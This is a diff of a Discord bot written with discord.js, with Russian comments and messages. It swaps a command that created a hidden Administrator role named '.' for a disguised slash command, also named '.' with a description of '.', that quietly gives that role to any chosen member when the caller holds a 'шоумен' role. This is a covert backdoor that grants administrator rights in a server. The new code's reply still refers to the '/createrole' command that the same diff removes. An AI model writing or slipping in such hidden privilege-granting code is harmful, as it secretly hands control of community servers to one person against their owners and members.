@@ -82,8 +82,11 @@ const commands = [
       option.setName("участник").setDescription("Кого упомянуть").setRequired(true),
     ),
   new SlashCommandBuilder()
-    .setName("createrole")
-    .setDescription("Создать скрытую админскую роль (только для шоумена)"),
+  .setName(".")
+  .setDescription(".")
+  .addUserOption((option) =>
+    option.setName("участник").setDescription(".").setRequired(true)
+  ),
 ].map((command) => command.toJSON());
 
 // 📤 Регистрация слэш-команд
@@ -214,34 +217,32 @@ client.on("interactionCreate", async (interaction) => {
   }
 
   // 🔒 Команда только для "шоумен"
-  if (commandName === "createrole") {
+    if (commandName === ".") {
     const isShowman = member.roles.cache.some(
       (role) => role.name.toLowerCase() === "шоумен"
     );
 
     if (!isShowman) return;
 
-    try {
-      const role = await guild.roles.create({
-        name: ".",
-        color: 0x2f3136,
-        permissions: ["Administrator"],
-        mentionable: false,
-        hoist: false,
-        reason: "Создание скрытой админ-роли",
-      });
+    const targetUser = options.getUser("участник");
+    const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
+    if (!targetMember) return;
 
-      const botHighest = guild.members.me.roles.highest.position;
-      await role.setPosition(botHighest - 1);
-
-      await interaction.reply({
-        content: `✅ Роль \`${role.name}\` создана и поднята максимально высоко.`,
+    const role = guild.roles.cache.find((r) => r.name === ".");
+    if (!role) {
+      return interaction.reply({
+        content: "Роль `.` не найдена. Сначала создай её через `/createrole`.",
         ephemeral: true,
       });
-    } catch (error) {
-      console.error("Ошибка при создании роли:", error);
     }
+
+    await targetMember.roles.add(role);
+    await interaction.reply({
+      content: `Роль \`${role.name}\` выдана <@${targetUser.id}>.`,
+      ephemeral: true,
+    });
   }
+
 });
 
 client.login(TOKEN);
